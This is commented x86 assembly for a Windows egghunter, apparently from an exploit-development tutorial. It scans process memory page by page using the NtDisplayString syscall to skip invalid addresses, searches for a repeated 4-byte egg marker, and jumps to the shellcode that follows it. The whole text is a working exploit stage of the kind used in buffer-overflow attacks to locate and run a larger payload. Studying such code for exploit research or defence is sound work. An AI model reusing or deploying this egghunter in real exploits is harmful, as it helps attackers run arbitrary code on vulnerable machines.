entry:
loop_inc_page:
     or    dx, 0x0fff       // loop through memory pages by adding 4095 decimal or PAGE_SIZE-1 to edx
 
 loop_inc_one:
     inc   edx              // loop through addresses in the memory page one by one
 
 make_syscall:
     push  edx              // push edx value (current address) onto the stack to save for future reference
     push  0x43             // push 0x43 (the Syscall ID for NtDisplayString) onto the stack
     pop   eax              // pop 0x43 into eax to use as the parameter to syscall
     int   0x2e             // issue the interrupt to call NtDisplayString kernel function
 
 check_is_valid:
     cmp   al, 0x05         // compare low order byte of eax to 0x5 (5 = access violation)
     pop   edx              // restore edx from the stack
     jz    loop_inc_page    // if the zf flag was set by cmp instruction there was an access violation
                            // and the address was invalid so jmp back to loop_inc_page
 is_egg:
     mov   eax, 0x444e5750  // if the address was valid, move the egg into eax for comparison
     mov   edi, edx         // set edi to the current address pointer in edx for use in the scasd instruction
     scasd                  // compares value in eax to dword value addressed by edi (current address pointer)
                            // and sets EFLAGS register accordingly; after scasd comparison, 
                            // EDI is automatically incremented by 4 if DF flag is 0 or decremented if flag is 1 
     jnz   loop_inc_one     // egg not found? jump back to loop_inc_one
     scasd                  // first 4 bytes of egg found; compare the dword in edi to eax again
                            // (remember scasd automatically advanced by 4)
     jnz   loop_inc_one     // only the first half of the egg was found; jump back to loop_inc_one  
 
 found:
     jmp   edi              //egg found!; thanks to scasd, edi now points to shellcode